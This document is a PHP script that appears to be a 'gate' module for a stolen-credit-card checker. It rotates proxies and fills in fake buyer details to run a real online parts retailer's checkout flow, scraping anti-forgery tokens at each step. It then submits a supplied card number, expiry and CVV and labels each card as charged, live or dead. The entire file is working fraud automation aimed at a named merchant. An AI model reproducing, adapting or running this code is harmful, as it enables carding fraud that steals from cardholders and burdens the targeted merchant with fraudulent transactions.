<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$brand = ([
	'3' => 'Amex',
	'4' => 'Visa',
	'5' => 'MasterCard',
	'6' => 'Discover'
])[substr($cc, 0, 1)] ?? '';

if (empty($brand)) {
	$empty = "This Gate doesn't Support Your Card Type";

	goto start;
}

$data = 'productId=2128&isAddToCartButton=true';

$headers = [
	'accept: */*',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded; charset=UTF-8',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/parts',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
	'x-requested-with: XMLHttpRequest'
];

$r1 = $this->curlx->Post('https://www.airpowerinc.com/GetMiniProductDetailsView', $data, $headers, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$RVT_V1 = $this->getstr($r1->body, '</div>    <input name="__RequestVerificationToken" type="hidden" value="', '" /></form>');

if (empty($RVT_V1)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$data = 'product_attribute_85=175&product_attribute_86=176&addtocart_2128.EnteredQuantity=1&addtocart_2128.addProductVariantToCartUrl=%2FAddProductFromProductDetailsPageToCartAjax&__RequestVerificationToken='.$RVT_V1.'';

$headers = [
	'accept: */*',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded; charset=UTF-8',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/parts',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
	'x-requested-with: XMLHttpRequest',
];

$r2 = $this->curlx->Post('https://www.airpowerinc.com/shoppingcart/productdetails_attributechange?productId=2128&validateAttributeConditions=False&loadPicture=True', $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$data = 'product_attribute_73=175&product_attribute_74=176&addtocart_2128.EnteredQuantity=1&addtocart_2128.addProductVariantToCartUrl=%2FAddProductFromProductDetailsPageToCartAjax&__RequestVerificationToken='.$RVT_V1.'&productId=2128&isAddToCartButton=true';

$headers = [
	'accept: */*',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded; charset=UTF-8',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/parts',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
	'x-requested-with: XMLHttpRequest',
];

$r3 = $this->curlx->Post('https://www.airpowerinc.com/AddProductFromProductDetailsPageToCartAjax', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$data = '------WebKitFormBoundaryWP0aufppAPnqI6IQ
Content-Disposition: form-data; name="itemquantity83863"

1
------WebKitFormBoundaryWP0aufppAPnqI6IQ
Content-Disposition: form-data; name="checkout_attribute_5"


------WebKitFormBoundaryWP0aufppAPnqI6IQ
Content-Disposition: form-data; name="qqfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryWP0aufppAPnqI6IQ
Content-Disposition: form-data; name="checkout_attribute_4"


------WebKitFormBoundaryWP0aufppAPnqI6IQ
Content-Disposition: form-data; name="discountcouponcode"


------WebKitFormBoundaryWP0aufppAPnqI6IQ
Content-Disposition: form-data; name="checkout"

checkout
------WebKitFormBoundaryWP0aufppAPnqI6IQ
Content-Disposition: form-data; name="__RequestVerificationToken"

'.$RVT_V1.'
------WebKitFormBoundaryWP0aufppAPnqI6IQ--';

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: multipart/form-data; boundary=----WebKitFormBoundaryWP0aufppAPnqI6IQ',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/cart',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r4 = $this->curlx->Post('https://www.airpowerinc.com/cart', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/login/checkoutasguest?returnUrl=%2Fcart',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r5 = $this->curlx->Get('https://www.airpowerinc.com/checkout/billingaddress', $headers, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$RVT_V2 = $this->getstr($r5->body, '<input name=__RequestVerificationToken type=hidden value=', '></form>');

if (empty($RVT_V2)) {
	$empty = 'Fifth Request Token is Empty';

	goto start;
}

$data = 'BillingNewAddress.Id=0&BillingNewAddress.FirstName=Jimmy&BillingNewAddress.LastName=Carter&BillingNewAddress.Email=cbpdapqoanlj%40scpulse.com&BillingNewAddress.Company=&BillingNewAddress.CountryId=1&BillingNewAddress.StateProvinceId=40&BillingNewAddress.City=New+York&BillingNewAddress.Address1=Street+123&BillingNewAddress.Address2=&BillingNewAddress.ZipPostalCode=10080&BillingNewAddress.PhoneNumber=8123331234&BillingNewAddress.FaxNumber=&address_attribute_2=2&nextstep=&__RequestVerificationToken='.$RVT_V2.'';

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/billingaddress',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r6 = $this->curlx->Post('https://www.airpowerinc.com/checkout/billingaddress', $data, $headers, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/billingaddress',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
];

$r7 = $this->curlx->Get('https://www.airpowerinc.com/checkout/shippingaddress', $headers, $cookie, $server['proxy']);

if (!$r7->success) goto start;

$RVT_V3 = $this->getstr($r7->body, '<input name=__RequestVerificationToken type=hidden value=', '>');

if (empty($RVT_V3)) {
	$empty = 'Seventh Request Token is Empty';

	goto start;
}

$data = 'pickup-points-id=1___Pickup.PickupInStore&ShippingNewAddress.Id=0&ShippingNewAddress.FirstName=Jimmy&ShippingNewAddress.LastName=Carter&ShippingNewAddress.Email=cbpdapqoanlj%40scpulse.com&ShippingNewAddress.Company=&ShippingNewAddress.CountryId=1&ShippingNewAddress.StateProvinceId=40&ShippingNewAddress.City=New+York&ShippingNewAddress.Address1=Street+123&ShippingNewAddress.Address2=&ShippingNewAddress.ZipPostalCode=10080&ShippingNewAddress.PhoneNumber=8123331234&ShippingNewAddress.FaxNumber=&address_attribute_2=2&nextstep=&__RequestVerificationToken='.$RVT_V3.'&PickupInStore=false';

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/shippingaddress',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r8 = $this->curlx->Post('https://www.airpowerinc.com/checkout/shippingaddress', $data, $headers, $cookie, $server['proxy']);

if (!$r8->success) goto start;

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/shippingaddress',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r9 = $this->curlx->Get('https://www.airpowerinc.com/checkout/shippingmethod', $headers, $cookie, $server['proxy']);

if (!$r9->success) goto start;

$RVT_V4 = $this->getstr($r9->body, '<input name=__RequestVerificationToken type=hidden value=', '></form>');

if (empty($RVT_V4)) {
	$empty = 'Ninth Request Token is Empty';

	goto start;
}

$data = 'shippingoption=Ground___Shipping.FixedByWeightByTotal&nextstep=&__RequestVerificationToken='.$RVT_V4.'';

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/shippingmethod',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r10 = $this->curlx->Post('https://www.airpowerinc.com/checkout/shippingmethod', $data, $headers, $cookie, $server['proxy']);

if (!$r10->success) goto start;

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/shippingmethod',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r11 = $this->curlx->Get('https://www.airpowerinc.com/checkout/paymentmethod', $headers, $cookie, $server['proxy']);

if (!$r11->success) goto start;

$RVT_V5 = $this->getstr($r11->body, '<input name=__RequestVerificationToken type=hidden value=', '></form>');

if (empty($RVT_V5)) {
	$empty = 'Eleventh Request Token is Empty';

	goto start;
}

$data = 'paymentmethod=BitShift.Payments.FirstData&nextstep=&__RequestVerificationToken='.$RVT_V5.'';

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/shippingmethod',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r12 = $this->curlx->Post('https://www.airpowerinc.com/checkout/paymentmethod', $data, $headers, $cookie, $server['proxy']);

if (!$r12->success) goto start;

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/paymentmethod',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r13 = $this->curlx->Get('https://www.airpowerinc.com/checkout/paymentinfo', $headers, $cookie, $server['proxy']);

if (!$r13->success) goto start;

$RVT_V6 = $this->getstr($r13->body, '<input name=__RequestVerificationToken type=hidden value=','></form>');

if (empty($RVT_V6)) {
	$empty = 'Thirteenth Request Token is Empty';

	goto start;
}

$data = 'CreditCardType='.$brand.'&CardholderName=John+Smith&CardNumber='.$cc.'&ExpireMonth='.$mm.'&ExpireYear='.$yyyy.'&CardCode='.$cvv.'&PurchaseOrderNumber=&nextstep=&__RequestVerificationToken='.$RVT_V6.'';

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/paymentinfo',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r14 = $this->curlx->Post('https://www.airpowerinc.com/checkout/paymentinfo', $data, $headers, $cookie, $server['proxy']);

if (!$r14->success) goto start;

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'dnt: 1',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/paymentinfo',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r15 = $this->curlx->Get('https://www.airpowerinc.com/checkout/confirm', $headers, $cookie, $server['proxy']);

if (!$r15->success) goto start;

$RVT_V7 = $this->getstr($r15->body, '<input name=__RequestVerificationToken type=hidden value=','></form>');

if (empty($RVT_V7)) {
	$empty = 'Fifteenth Request Token is Empty';

	goto start;
}

$data = 'nextstep=&__RequestVerificationToken='.$RVT_V7.'';

$headers = [
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9',
	'cache-control: no-cache',
	'content-type: application/x-www-form-urlencoded',
	'dnt: 1',
	'origin: https://www.airpowerinc.com',
	'pragma: no-cache',
	'referer: https://www.airpowerinc.com/checkout/confirm',
	'sec-ch-ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
];

$r16 = $this->curlx->Post('https://www.airpowerinc.com/checkout/confirm', $data, $headers, $cookie, $server['proxy']);

if (!$r16->success) goto start;

$err = trim(strip_tags($this->getstr($r16->body, '<li>Payment error:', '</li>')));

if (empty($err)) $err = trim(strip_tags($this->getstr($r16->body, '<div class="message-error">', '</div>')));

if (empty($err)) $err = trim(strip_tags($this->getstr($r16->body, 'paymentTitle>', '<')));

$status = ['status' => 'APPROVED', 'emoji' => '✅'];

if (strpos($r16->body, 'Thank you for your order')) {
	$transaction_id = trim(strip_tags($this->getstr($r16->body, 'transaction_id:"', '"')));

	$status['msg'] = "CHARGED - Thank you for your order!".(empty($transaction_id) ? "" : " ($transaction_id)");
} elseif (strpos(strtolower($err), 'insufficient funds') !== false || strpos(strtolower($err), 'credit floor') !== false) {
	$status['msg'] = "CVV CARD - Insufficient Funds -> $err!";
} elseif (strpos($err, 'CVV2/VAK Failure') !== false) {
	$status['msg'] = "CCN CARD - $err!";
} else {
	if (empty($err)) file_put_contents('fda_r16_err.txt', $r16->body . PHP_EOL, FILE_APPEND);

	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => 'DEAD - '.(empty($err) ? 'Unknown Error' : $err).'!'];
}

end: